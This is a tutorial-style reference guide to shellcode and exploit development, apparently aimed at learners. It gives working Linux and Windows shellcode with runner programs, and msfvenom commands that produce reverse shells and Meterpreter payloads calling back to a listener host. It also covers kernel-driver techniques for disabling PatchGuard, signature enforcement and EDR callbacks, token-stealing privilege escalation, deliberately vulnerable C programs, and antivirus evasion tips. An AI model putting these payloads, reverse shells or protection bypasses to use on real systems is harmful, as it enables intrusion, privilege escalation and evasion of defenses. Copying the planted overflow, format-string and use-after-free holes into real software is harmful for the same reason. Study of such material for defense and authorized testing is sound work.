# Shellcode

## The Complete Shellcode & Vulnerability Development Reference Guide

_From Assembly to Kernel Drivers: A Comprehensive Journey_

***

### Table of Contents

1. Introduction
2. Linux Shellcode Development
3. Windows Shellcode Development
4. Metasploit Workflow
5. Kernel Driver Exploitation
6. Creating Vulnerable Software
7. Debugging & Analysis Tools
8. Common Pitfalls & Solutions

***

### Introduction

This guide documents the complete process of shellcode development, from basic assembly to advanced kernel-level exploitation. Whether you're a beginner learning buffer overflows or an experienced researcher developing custom exploits, this reference provides the foundational knowledge and practical examples needed to understand and create working shellcode.

#### Key Concepts

* **Shellcode**: Position-independent machine code that executes a desired payload
* **System Calls**: The interface between user space and kernel functionality
* **API Resolution**: The process of dynamically finding function addresses in memory
* **Bad Characters**: Bytes that would break the shellcode in specific contexts

***

### Linux Shellcode Development

#### Basic Linux execve("/bin/sh") Shellcode

**Assembly Code**

nasm

```
section .text
    global _start

_start:
    ; Clear registers to avoid null bytes
    xor eax, eax        ; Clear EAX
    mov al, 0x0b        ; Syscall number for execve (11)

    ; Build "/bin/sh" string on stack
    push eax            ; Null terminator
    push 0x68732f2f     ; "hs//" (little-endian)
    push 0x6e69622f     ; "nib/" (little-endian)

    ; Set up registers for syscall
    mov ebx, esp        ; EBX points to "/bin/sh" string
    xor ecx, ecx        ; ECX = NULL (argv)
    xor edx, edx        ; EDX = NULL (envp)

    int 0x80            ; Trigger syscall interrupt
```

**Compilation and Extraction**

bash

```
# Assemble the code
nasm -f elf32 shellcode.asm -o shellcode.o

# Link for testing
ld -m elf_i386 shellcode.o -o shellcode

# Extract opcodes
objdump -d shellcode.o
```

**Resulting Shellcode**

text

```
\x31\xc0\xb0\x0b\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80
```

**Testing Shellcode**

c

```
#include <stdio.h>

char code[] = \
"\x31\xc0\xb0\x0b\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
"\x89\xe3\x31\xc9\x31\xd2\xcd\x80";

int main() {
    printf("Shellcode length: %d bytes\n", (int)sizeof(code)-1);
    int (*ret)() = (int(*)())code;
    ret();
    return 0;
}
```

**Compile with:** `gcc -m32 -z execstack -fno-stack-protector test_shellcode.c -o test_shellcode`

#### Null-Free Optimized Version

nasm

```
section .text
    global _start

_start:
    ; Clear registers without null bytes
    xor ecx, ecx        ; ECX = 0
    mul ecx             ; EAX * ECX -> zeros EAX and EDX

    mov al, 0xb         ; Syscall number

    ; Push string without null bytes
    push ecx            ; Push 0 using cleared register
    push 0x68732f2f     ; "hs//"
    push 0x6e69622f     ; "nib/"

    mov ebx, esp        ; EBX points to string
    int 0x80            ; Syscall
```

***

### Windows Shellcode Development

#### Key Differences from Linux

1. **No Direct Syscalls**: Must call Windows API functions
2. **Dynamic API Resolution**: Addresses change due to ASLR
3. **PEB Walking**: Technique to find DLL base addresses
4. **API Hashing**: Using hashes instead of string names

#### Windows execve Equivalent: WinExec

**High-Level Plan**

c

```
// What we want to achieve
WinExec("calc.exe", 1);
ExitProcess(0);  // Optional but recommended
```

#### Manual PEB Walking Approach

**Conceptual Assembly Structure**

nasm

```
start:
    ; --- 1. Find kernel32.dll base address ---
    xor ecx, ecx
    mov esi, [fs:ecx + 0x30]    ; PEB pointer
    mov esi, [esi + 0x0C]       ; PEB->Ldr
    mov esi, [esi + 0x14]       ; First module (ntdll.dll)
    mov esi, [esi]              ; Second module (kernel32.dll)
    mov ebx, [esi + 0x10]       ; EBX = kernel32.dll base

    ; --- 2. Find WinExec by hash ---
    mov edx, 0x876F8B31         ; Hash of "WinExec"
    call find_function_by_hash

    ; --- 3. Call WinExec ---
    xor edx, edx
    push edx                    ; Null terminator
    push 0x6578652e             ; "exe."
    push 0x636c6163             ; "clac" ("calc" reversed)
    mov ecx, esp                ; ECX points to "calc.exe"

    push 1                      ; uCmdShow = SW_SHOWNORMAL
    push ecx                    ; lpCmdLine = "calc.exe"
    call eax                    ; Call WinExec

find_function_by_hash:
    ; Complex EAT parsing code
    ; EBX = DLL base, EDX = hash
    ; Returns function address in EAX
    ret
```

#### Practical Metasploit Approach

**Installing Metasploit (Without Snap)**

bash

```
# Download official installer
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall

# Make executable and run
chmod +x msfinstall
sudo ./msfinstall
```

**Generating Windows Shellcode**

bash

```
msfvenom -p windows/exec CMD=calc.exe -f c -a x86 --platform windows -b '\x00'
```

**Flags Explanation:**

* `-p windows/exec`: Payload that executes a command
* `CMD=calc.exe`: Command to execute
* `-f c`: Output format (C array)
* `-a x86`: Architecture (32-bit)
* `--platform windows`: Target platform
* `-b '\x00'`: Remove null bytes (common bad character)

**Example Output**

c

```
unsigned char buf[] =
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
```

**Windows Shellcode Testing Program**

c

```
#include <windows.h>
#include <stdio.h>

// Paste your msfvenom output here
unsigned char code[] = \
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

int main() {
    printf("Shellcode length: %d bytes\n", (int)sizeof(code));
    
    // Allocate executable memory
    void *exec_mem = VirtualAlloc(0, sizeof(code), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_mem == NULL) {
        printf("VirtualAlloc failed!\n");
        return -1;
    }
    
    // Copy shellcode to executable memory
    RtlMoveMemory(exec_mem, code, sizeof(code));
    
    // Execute
    printf("Executing shellcode...\n");
    int (*func)() = (int(*)())exec_mem;
    func();
    
    printf("Done!\n");
    return 0;
}
```

**Compile with:** `gcc test_shellcode.c -o test_shellcode.exe`

***

### Metasploit Workflow

#### Common msfvenom Payloads

**Windows Payloads**

bash

```
# Basic calc execution
msfvenom -p windows/exec CMD=calc.exe -f c -a x86 --platform windows

# Reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c -a x86

# Meterpreter reverse TCP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c -a x86
```

**Linux Payloads**

bash

```
# Linux exec
msfvenom -p linux/x86/exec CMD=/bin/sh -f c -a x86 --platform linux

# Linux reverse shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c -a x86
```

**Output Formats**

bash

```
-f c          # C array
-f python     # Python bytes
-f raw        # Raw binary
-f exe        # Windows executable
-f elf        # Linux ELF binary
```

***

### Kernel Driver Exploitation

#### Why Use Kernel Drivers?

Kernel drivers (Ring 0) have complete system authority, enabling capabilities impossible in user mode:

#### Common Kernel Driver Techniques

**1. Disabling Security Mechanisms**

c

```
// Conceptual examples - actual implementation varies
DisablePatchguard();    // Bypass Kernel Patch Protection
DisableDSE();           // Bypass Driver Signature Enforcement
UnregisterCallbacks();  // Remove AV/EDR kernel callbacks
```

**2. Token Stealing Payload**

The classic privilege escalation technique:

**Conceptual Process:**

1. Find `EPROCESS` structure for `System` process (PID 4)
2. Find `EPROCESS` structure for target process (e.g., cmd.exe)
3. Copy the security `Token` from System to target process
4. Target process now runs as `NT AUTHORITY\SYSTEM`

**3. Direct Memory Manipulation**

c

```
// Kernel drivers can read/write any process memory
ReadProcessMemory(any_pid, any_address, buffer, size);
WriteProcessMemory(any_pid, any_address, shellcode, size);
```

#### Kernel Driver Challenges

1. **Patchguard (KPP)**: Must be bypassed on 64-bit Windows
2. **Driver Signature Enforcement (DSE)**: Requires signed drivers or bypasses
3. **Hypervisor-Protected Code Integrity (HVCI)**: Additional memory protection
4. **Kernel Patch Protection**: Prevents modification of core kernel structures

#### Practical Considerations

* Use **Vulnerable Driver** for testing (like Intel `iqvw64e.sys`)
* Test in **VM with protections disabled** initially
* Consider **DSE bypass techniques** for research
* Always use **development/test environments**

***

### Creating Vulnerable Software

Building custom vulnerable applications is crucial for understanding exploitation techniques in isolation.

#### 1. Stack-Based Buffer Overflow

**Vulnerable Code**

c

```
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking!
}

int main(int argc, char *argv[]) {
    if (argc > 1) {
        vulnerable_function(argv[1]);
    }
    return 0;
}
```

**Compilation Flags:**

bash

```
gcc -m32 -fno-stack-protector -z execstack vuln.c -o vuln
```

**Exploitation Steps:**

1. Crash with long input: `./vuln $(python -c "print 'A'*100")`
2. Find EIP overwrite offset
3. Replace with shellcode address

#### 2. Format String Vulnerability

**Vulnerable Code**

c

```
#include <stdio.h>

int main(int argc, char *argv[]) {
    if (argc > 1) {
        printf(argv[1]);  // User input as format string!
        printf("\n");
    }
    return 0;
}
```

**Exploitation:**

* Read memory: `%x %x %x %x`
* Write to memory: `%n` format specifier
* Overwrite GOT entries

#### 3. Heap Overflow / Use-After-Free

**Vulnerable Code**

c

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct object {
    char name[32];
    void (*print_name)(struct object*);
};

void print_object_name(struct object *obj) {
    printf("Name: %s\n", obj->name);
}

int main() {
    struct object *obj1 = malloc(sizeof(struct object));
    struct object *obj2 = malloc(sizeof(struct object));
    
    strcpy(obj1->name, "First Object");
    obj1->print_name = print_object_name;
    
    // Free the object
    free(obj1);
    
    // Use after free - vulnerability!
    obj1->print_name(obj1);
    
    return 0;
}
```

#### 4. Integer Overflow

**Vulnerable Code**

c

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void process_data(char *data, unsigned int len) {
    // Integer overflow vulnerability
    unsigned int buffer_size = len + 10;
    char *buffer = malloc(buffer_size);
    
    if (buffer) {
        // Potential buffer overflow if len + 10 wraps around
        memcpy(buffer, data, len);
        buffer[len] = '\0';
        printf("Processed: %s\n", buffer);
        free(buffer);
    }
}

int main() {
    char data[100];
    unsigned int length;
    
    printf("Enter length: ");
    scanf("%u", &length);
    
    printf("Enter data: ");
    read(0, data, 100);
    
    process_data(data, length);
    return 0;
}
```

***

### Advanced Protection Bypasses

#### Modern Exploitation Challenges

**1. Data Execution Prevention (DEP)**

**Problem:** Stack/Heap not executable\
**Solution:** Return-Oriented Programming (ROP)

bash

```
# Compile without execstack
gcc -m32 -fno-stack-protector vuln.c -o vuln_dep
```

**2. Address Space Layout Randomization (ASLR)**

**Problem:** Memory addresses randomized\
**Solution:** Information leaks to defeat randomization

bash

```
# Enable ASLR (Linux)
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```

**3. Stack Canaries**

**Problem:** Stack corruption detection\
**Solution:** Leak canary value or bypass check

bash

```
# Compile with stack protector
gcc -m32 vuln.c -o vuln_canary
```

**4. Control Flow Integrity (CFI)**

**Problem:** Indirect call validation\
**Solution:** Advanced ROP techniques, JOP/COP

#### Protection Matrix

| Protection   | Compiler Flag       | Bypass Technique     |
| ------------ | ------------------- | -------------------- |
| DEP          | `-z noexecstack`    | ROP chains           |
| Stack Canary | `-fstack-protector` | Canary leakage       |
| ASLR         | System setting      | Information leak     |
| PIE          | `-fPIE -pie`        | Base calculation     |
| RELRO        | `-z relro`          | GOT overwrite timing |

***

### Debugging & Analysis Tools

#### Essential Tools Checklist

**Linux Tools**

bash

```
# Debuggers
gdb                 # GNU Debugger
gdb with gef/pwndbg # Enhanced GDB plugins

# Disassemblers
objdump -d          # Object file disassembly
radare2             # Advanced reverse engineering

# Analysis
strace              # System call tracing
ltrace              # Library call tracing

# Memory analysis
gcore               # Core dump generation
```

**Windows Tools**

bash

```
# Debuggers
x64dbg              # User-mode debugger
WinDbg              # Microsoft debugger (kernel/user)

# Analysis
Process Explorer    # Process monitoring
Process Monitor     # Real-time system monitoring
API Monitor         # API call tracing
```

**Cross-Platform**

bash

```
# Analysis
strace/ltrace       # Linux system/library calls
Wireshark           # Network analysis
```

#### GDB Enhanced with GEF/Pwndbg

bash

```
# Install GEF
wget -q -O ~/.gdbinit-gef.py https://github.com/hugsy/gef/raw/master/gef.py
echo "source ~/.gdbinit-gef.py" >> ~/.gdbinit

# Common commands
gdb ./vuln
run $(python -c "print 'A'*100")
info registers
x/20wx $esp
pattern create 100
pattern offset $eip
```

#### Practical Debugging Workflow

1. **Crash Reproduction**: Trigger the vulnerability
2. **Control Verification**: Confirm EIP control
3. **Bad Character Analysis**: Test shellcode bytes
4. **Exploit Development**: Build working payload
5. **Reliability Testing**: Ensure consistent execution

***

### Common Pitfalls & Solutions

#### Problem: Shellcode Contains Null Bytes

**Solution:**

* Use register clearing with `xor reg, reg`
* Avoid instructions that generate nulls
* Use `msfvenom -b '\x00'` for automatic encoding

#### Problem: Shellcode Crashes

**Solution:**

* Check for bad characters in target context
* Verify stack alignment
* Ensure proper memory permissions

#### Problem: Address Changes Between Runs (ASLR)

**Solution:**

* Use information leaks to calculate addresses
* Implement ROP chains
* Use relative addressing where possible

#### Problem: Antivirus Detection

**Solution:**

* Custom shellcode encoding
* Obfuscation techniques
* Living-off-the-land binaries (LOLBins)

#### Problem: Modern Protections

**Solution:**

* Combine multiple bypass techniques
* Use information disclosure vulnerabilities
* Chain multiple vulnerabilities together

***

### Quick Reference Commands

#### Essential Compilation Flags

bash

```
# 32-bit, no protections (learning)
gcc -m32 -fno-stack-protector -z execstack vuln.c -o vuln

# 32-bit with DEP
gcc -m32 -fno-stack-protector vuln.c -o vuln_dep

# 32-bit with all protections
gcc -m32 vuln.c -o vuln_secure

# 64-bit
gcc -fno-stack-protector -z execstack vuln.c -o vuln64
```

#### Metasploit Quick Reference

bash

```
# Install
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod +x msfinstall
sudo ./msfinstall

# Generate payloads
msfvenom -p windows/exec CMD=calc.exe -f c -a x86 -b '\x00'
msfvenom -p linux/x86/exec CMD=/bin/sh -f c -a x86
msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=4444 -f exe > payload.exe
```

#### Debugging Commands

bash

```
# Linux debugging
gdb ./program
run $(python -c "print 'A'*100")
info registers
x/10wx $esp

# Windows testing
gcc test_shellcode.c -o test_shellcode.exe
# Disable AV temporarily for testing!
```

***

### Conclusion

This comprehensive guide covers the complete journey from basic shellcode development to advanced kernel-level exploitation. The key to mastery is practice - start with simple stack overflows, progress through modern protections, and eventually tackle real-world exploitation scenarios.

Remember: Always conduct security research in appropriate environments with proper authorization. This knowledge is powerful and should be used responsibly for education, defense, and authorized testing purposes.
